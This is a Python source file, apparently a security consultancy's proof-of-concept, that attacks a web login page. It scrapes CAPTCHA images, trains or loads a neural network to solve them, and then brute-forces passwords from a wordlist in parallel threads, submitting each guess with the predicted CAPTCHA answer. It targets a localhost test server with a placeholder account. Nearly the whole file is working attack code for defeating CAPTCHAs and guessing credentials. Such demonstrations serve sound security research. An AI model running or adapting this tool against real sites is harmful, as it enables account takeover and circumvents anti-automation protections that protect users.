import threading
import requests
import time
import sys
from label import label_mnist
from get_attacker_from_ckpt import get_attacker_from_ckpt_emnist, get_attacker_from_ckpt_python
from dl_models import attacker_cnn_mnist
from bs4 import BeautifulSoup
from PIL import Image
import numpy as np 
from utils import convert_to_tfds, label_to_chr_emnist
from feature_extractor import feature_extraction
import matplotlib.pyplot as plt
import tensorflow as tf
import cv2
from io import BytesIO
from urllib.request import urlopen


BEGIN = """ 
██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████ 
                                                                                       
                                Wavestone POC attack
"""


MNIST = """
███    ███ ███    ██ ██ ███████ ████████ 
████  ████ ████   ██ ██ ██         ██    
██ ████ ██ ██ ██  ██ ██ ███████    ██    
██  ██  ██ ██  ██ ██ ██      ██    ██    
██      ██ ██   ████ ██ ███████    ██    
                                         
                                         """

EMNIST = """
███████       ███    ███ ███    ██ ██ ███████ ████████ 
██            ████  ████ ████   ██ ██ ██         ██    
█████   █████ ██ ████ ██ ██ ██  ██ ██ ███████    ██    
██            ██  ██  ██ ██  ██ ██ ██      ██    ██    
███████       ██      ██ ██   ████ ██ ███████    ██    
                                                       
                                                       """

PYTHON = """
██████  ██    ██ ████████ ██   ██  ██████  ███    ██ 
██   ██  ██  ██     ██    ██   ██ ██    ██ ████   ██ 
██████    ████      ██    ███████ ██    ██ ██ ██  ██ 
██         ██       ██    ██   ██ ██    ██ ██  ██ ██ 
██         ██       ██    ██   ██  ██████  ██   ████ 
                                                     
                                                     """

DONE = """
██████   ██████  ███    ██ ███████     ██ 
██   ██ ██    ██ ████   ██ ██          ██ 
██   ██ ██    ██ ██ ██  ██ █████       ██ 
██   ██ ██    ██ ██  ██ ██ ██             
██████   ██████  ██   ████ ███████     ██ 
                                          
                                          """





print (BEGIN)
sys.stdout.flush()

CAPTCHA_TYPE = sys.argv[1] if len(sys.argv) >= 2 else 0
NUM_ITERATIONS = sys.argv[2] if len(sys.argv) >= 3 else 5
LR_FOR_MNIST = sys.argv[3] if len(sys.argv) >= 4 else 0.001

class BruteForceCracker:
    def __init__(self, url, username, error_message_password, trained_model):
        self.url = url
        self.username = username
        self.error_message_password = error_message_password
        self.trained_model = trained_model
        
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, password, num_iter=5):
        for i in range(num_iter) : 
            print("--------- {} captcha try -------------".format(i+1))
            current_captcha = retrieve_captcha_images(self.url, number_iter=1)
            if CAPTCHA_TYPE == 0 : 
                tfds_captcha = convert_to_tfds(current_captcha)
                preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)  
                preds_numpy = preds.numpy()  
            if CAPTCHA_TYPE == 1 : 
                tfds_captcha = convert_to_tfds(current_captcha)
                preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)
                preds_numpy = label_to_chr_emnist(preds)
            if CAPTCHA_TYPE == 2 : 
                characters = feature_extraction(current_captcha[0])
                if len(characters)<4 : 
                    return 0
                images = []
                for index, character in enumerate(characters) : 
                    if character.size == 0 : 
                        return 0
                    resized_image = cv2.resize(character, (28, 28), interpolation=cv2.INTER_AREA)
                    pixels = np.array(resized_image).reshape(28, 28, 1)
                    images.append(pixels)
                tfds_captcha = convert_to_tfds(images)
                preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)
                preds_numpy = label_to_chr_emnist(preds)
            preds_string = ''.join([str(idx) for idx in preds_numpy])
            data_dict = {"email": self.username, "password": password, "captcha_input": preds_string}
            response = requests.post(self.url, data=data_dict)
            if "Welcome" in str(response.content):
                print("Username: ---> " + self.username)
                print("Password: ---> " + password)
                return True
        print("\n")
        return False

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password, num_iter=NUM_ITERATIONS):
            return
    print("No Password Found !")

def retrieve_captcha_images(url, number_iter=300) : 
    img_url = []
    for _ in range(number_iter) : 
        response = requests.get(url, allow_redirects=True)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            div_tag = soup.find('div', id='randomImages')
            if div_tag:
                imgs = div_tag.find_all('img')
                for img in imgs : 
                    img_url.append(img.get("src"))
            else:
                print("Div tag not found.")
            
        else:
            print("Failed to retrieve data. Status code : ", response.status_code)
    stock_image = []
    # print(img_url)
    for i in range (len(img_url)):
        img_url[i] = "http://localhost:3006" + img_url[i]
        response = requests.get(img_url[i], stream = True)
        if response.status_code == 200:
            image = Image.open(response.raw)
            if CAPTCHA_TYPE != 2 :
                pixels = np.array(list(image.getdata())).reshape(28, 28, 1)
            else : 
                req = urlopen(img_url[i])
                arr = np.asarray(bytearray(req.read()), dtype=np.uint8)
                pixels = cv2.imdecode(arr, -1)
                cv2.imwrite("captcha.jpeg", pixels)
                pixels = cv2.imread("captcha.jpeg")
            stock_image.append(pixels)
        else : 
            print("error response")
    return stock_image


def main(): 

    global CAPTCHA_TYPE
    CAPTCHA_TYPE = int(sys.argv[1]) if len(sys.argv) > 1 else 0

    error = "Password incorrect! Please try again."
    username="test@test.test"

    if CAPTCHA_TYPE == 0 :
        url = "http://localhost:3006/auth/login"

        print("\n\nSelected captcha type :")
        print(MNIST)

        ######################### MNIST Captcha #########################
        print("\n\n\n######################### Starting attack pipeline #########################")
        print("\n\n1/8 : Retrieving captcha images")
        sys.stdout.flush()
        captcha_images = retrieve_captcha_images("http://localhost:3006/auth/login", number_iter=300)
        print("Images retrieved successfully !")
        print("\n\n2/8 : Converting images to tensorflow dataset")
        sys.stdout.flush()
        tfds_captcha_images = convert_to_tfds(captcha_images)
        print("Images successfully converted !")
        print("\n\n3/8 : Labeling images with MNIST")
        sys.stdout.flush()
        predictions = label_mnist(tfds_captcha_images)
        print("Images successfully labeled !")
        print("\n\n4/8 : Converting attacker images to tensorflow dataset")
        sys.stdout.flush()
        attacker_dataset = convert_to_tfds(captcha_images, predictions)
        print("Attack images successfully converted !")
        print("\n\n5/8 : Creating attacker Neural Network")
        sys.stdout.flush()
        attacker_model = attacker_cnn_mnist.create_model(lr=LR_FOR_MNIST)
        print("Attacker model successfully created !")
        print("\n\n6/8 : Training attacker model")
        sys.stdout.flush()
        trained_model = attacker_cnn_mnist.train(attacker_model, attacker_dataset, epochs=5)
        print("Attacker model successfully trained !")
        print("\n\n7/8 : Initializing bruteforce cracker with trained attacker model")
        sys.stdout.flush()
        cracker = BruteForceCracker(url, username, error, trained_model)
        print("Bruteforce cracker initialization complete !")
        print("\n\n8/8 : Launching bruteforce cracker with trained attacker model")
        sys.stdout.flush()
        ###############################################################
    elif CAPTCHA_TYPE == 1 : 
        url = "http://localhost:3006/auth/login?captchaType=EMNIST"
        
        print("\n\nSelected captcha type :")
        print(EMNIST)
        ###################### EMNIST Captcha #########################
        print("\n\n\n######################### Starting attack pipeline #########################")
        print("\n\n1/3 : Retrieving trained attacker model")
        sys.stdout.flush()
        emnist_model = get_attacker_from_ckpt_emnist()
        print("Attacker model successfully loaded !")        
        print("\n\n2/3 : Initializing bruteforce cracker with trained attacker model")
        sys.stdout.flush()
        cracker = BruteForceCracker(url, username, error, emnist_model)
        print("Bruteforce cracker initialization complete !")
        print("\n\n3/3 : Launching bruteforce cracker with trained attacker model")
        sys.stdout.flush()
        ###############################################################
    else : 
        url = "http://localhost:3006/auth/login?captchaType=Python"

        print("\n\nSelected captcha type :")
        print(PYTHON)
        ###################### Python Captcha #########################
        print("\n\n\n######################### Starting attack pipeline #########################")
        print("\n\n1/3 : Retrieving trained attacker model")
        sys.stdout.flush()
        python_model = get_attacker_from_ckpt_python()
        print("Attacker model successfully loaded !")        
        print("\n\n2/3 : Initializing bruteforce cracker with trained attacker model")
        sys.stdout.flush()
        cracker = BruteForceCracker(url, username, error, python_model)
        print("Bruteforce cracker initialization complete !")
        print("\n\n3/3 : Launching bruteforce cracker with trained attacker model")
        sys.stdout.flush()
        ###############################################################


    threads = []
    with open("passwords_.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()
            threads.append(t)
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    banner = """ 
                Checking the Server !!        
[+]█████████████████████████████████████████████████[+]
"""
    # print(banner)
    #retrieve_captcha_images("http://localhost:3006/auth/login", 1)
    main()
    #retrieve_captcha_images("http://localhost:3006/auth/login?captchaType=Python", number_iter=3)
    #fetch_captcha("http://localhost:3006/auth/login?captchaType=Python")t images ok
    print(DONE)